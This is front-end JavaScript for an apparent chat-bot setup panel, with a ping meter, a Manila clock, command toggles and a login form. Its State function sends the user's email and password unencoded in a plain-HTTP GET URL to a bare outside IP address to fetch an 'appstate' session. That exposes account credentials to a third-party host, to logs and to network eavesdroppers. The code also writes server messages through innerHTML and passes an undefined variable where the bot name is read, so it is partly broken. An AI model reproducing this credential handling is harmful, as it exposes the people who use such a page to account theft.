document.getElementById('agreeCheckbox').addEventListener('change', function() {
  document.getElementById('submitButton').disabled = !this.checked;
});
let Commands = [{
  'commands': []
}, {
  'handleEvent': []
}];

function measurePing() {
  var xhr = new XMLHttpRequest();
  var startTime, endTime;
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
      endTime = Date.now();
      var pingTime = endTime - startTime;
      document.getElementById("ping").textContent = pingTime + " ms";
    }
  };
  xhr.open("GET", location.href + "?t=" + new Date().getTime());
  startTime = Date.now();
  xhr.send();
}
setInterval(measurePing, 1000);

function updateTime() {
  const now = new Date();
  const options = {
    timeZone: 'Asia/Manila',
    hour12: true,
    hour: 'numeric',
    minute: 'numeric',
    second: 'numeric'
  };
  const formattedTime = now.toLocaleString('en-US', options);
  document.getElementById('time').textContent = formattedTime;
}
updateTime();
setInterval(updateTime, 1000);

async function State() {
    const emailInput = document.getElementById('email').value;
    const passwordInput = document.getElementById('password').value;
    const button = document.getElementById('submitButton');

    // Validate email and password fields
    if (!emailInput || !passwordInput) {
        return showResult('Please provide both email and password.');
    }

    try {
        button.disabled = true; // Disable the submit button while processing

        // Fetch the app state using email and password
        const response = await fetch(`http://65.109.58.118:26011/api/appstate?e=${emailInput}&p=${passwordInput}`);
        const data = await response.json();

        if (data.success) {
          const Appstate = data.success;
            // Clear input fields
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';

            // Send the retrieved app state to the server along with other data
            const response = await fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    state: Appstate, // Send the retrieved app state
                    commands: Commands,
                    prefix: document.getElementById('inputOfPrefix').value,
                    admin: document.getElementById('inputOfAdmin').value,
                    botName: document.getElementById(inputOfBotName).value,
                }),
            });

            const responseData = await response.json();

            if (responseData.success) {
                showResult(responseData.message);
            } else {
                showResult(responseData.message);
            }
        } else {
            showResult('Login failed. Please check your credentials.');
        }
    } catch (error) {
        console.error('Error:', error);
        showResult('An error occurred. Please try again later.');
    } finally {
        button.disabled = false; // Re-enable the submit button
    }
}

function showResult(message) {
  const resultContainer = document.getElementById('result');
  resultContainer.innerHTML = `<h5>${message}</h5>`;
  resultContainer.style.display = 'block';
}
async function commandList() {
  try {
    const [listOfCommands, listOfCommandsEvent] = [document.getElementById('listOfCommands'), document.getElementById('listOfCommandsEvent')];
    const response = await fetch('/commands');
    const {
      commands,
      handleEvent,
      aliases
    } = await response.json();
    [commands, handleEvent].forEach((command, i) => {
      command.forEach((command, index) => {
        const container = createCommand(i === 0 ? listOfCommands : listOfCommandsEvent, index + 1, command, i === 0 ? 'commands' : 'handleEvent', aliases[index] || []);
        i === 0 ? listOfCommands.appendChild(container) : listOfCommandsEvent.appendChild(container);
      });
    });
  } catch (error) {
    console.log(error);
  }
}

function createCommand(element, order, command, type, aliases) {
  const container = document.createElement('div');
  container.classList.add('form-check', 'form-switch');
  container.onclick = toggleCheckbox;
  const checkbox = document.createElement('input');
  checkbox.classList.add('form-check-input', type === 'handleEvent' ? 'handleEvent' : 'commands');
  checkbox.type = 'checkbox';
  checkbox.role = 'switch';
  checkbox.id = `flexSwitchCheck_${order}`;
  const label = document.createElement('label');
  label.classList.add('form-check-label', type === 'handleEvent' ? 'handleEvent' : 'commands');
  label.for = `flexSwitchCheck_${order}`;
  label.textContent = `${order}. ${command}`;
  container.appendChild(checkbox);
  container.appendChild(label);
  /*
  if (aliases.length > 0 && type !== 'handleEvent') {
    const aliasText = document.createElement('span');
    aliasText.classList.add('aliases');
    aliasText.textContent = ` (${aliases.join(', ')})`;
    label.appendChild(aliasText);
  }
  */
  return container;
}

function toggleCheckbox() {
  const box = [{
    input: '.form-check-input.commands',
    label: '.form-check-label.commands',
    array: Commands[0].commands
  }, {
    input: '.form-check-input.handleEvent',
    label: '.form-check-label.handleEvent',
    array: Commands[1].handleEvent
  }];
  box.forEach(({
    input,
    label,
    array
  }) => {
    const checkbox = this.querySelector(input);
    const labelText = this.querySelector(label);
    if (checkbox) {
      checkbox.checked = !checkbox.checked;
      if (checkbox.checked) {
        labelText.classList.add('disable');
        const command = labelText.textContent.replace(/^\d+\.\s/, '').split(" ")[0];
        array.push(command);
      } else {
        labelText.classList.remove('disable');
        const command = labelText.textContent.replace(/^\d+\.\s/, '').split(" ")[0];
        const removeCommand = array.indexOf(command);
        if (removeCommand !== -1) {
          array.splice(removeCommand, 1);
        }
      }
    }
  });
}

function selectAllCommands() {
  const box = [{
    input: '.form-check-input.commands',
    array: Commands[0].commands
  }];
  box.forEach(({
    input,
    array
  }) => {
    const checkboxes = document.querySelectorAll(input);
    const allChecked = Array.from(checkboxes).every(checkbox => checkbox.checked);
    checkboxes.forEach((checkbox) => {
      if (allChecked) {
        checkbox.checked = false;
        const labelText = checkbox.nextElementSibling;
        labelText.classList.remove('disable');
        const command = labelText.textContent.replace(/^\d+\.\s/, '').split(" ")[0];
        const removeCommand = array.indexOf(command);
        if (removeCommand !== -1) {
          array.splice(removeCommand, 1);
        }
      } else {
        checkbox.checked = true;
        const labelText = checkbox.nextElementSibling;
        labelText.classList.add('disable');
        const command = labelText.textContent.replace(/^\d+\.\s/, '').split(" ")[0];
        if (!array.includes(command)) {
          array.push(command);
        }
      }
    });
  });
}

function selectAllEvents() {
  const box = [{
    input: '.form-check-input.handleEvent',
    array: Commands[1].handleEvent
  }];
  box.forEach(({
    input,
    array
  }) => {
    const checkboxes = document.querySelectorAll(input);
    const allChecked = Array.from(checkboxes).every(checkbox => checkbox.checked);
    checkboxes.forEach((checkbox) => {
      if (allChecked) {
        checkbox.checked = false;
        const labelText = checkbox.nextElementSibling;
        labelText.classList.remove('disable');
        const event = labelText.textContent.replace(/^\d+\.\s/, '').split(" ")[0];
        const removeEvent = array.indexOf(event);
        if (removeEvent !== -1) {
          array.splice(removeEvent, 1);
        }
      } else {
        checkbox.checked = true;
        const labelText = checkbox.nextElementSibling;
        labelText.classList.add('disable');
        const event = labelText.textContent.replace(/^\d+\.\s/, '').split(" ")[0];
        if (!array.includes(event)) {
          array.push(event);
        }
      }
    });
  });
}
commandList();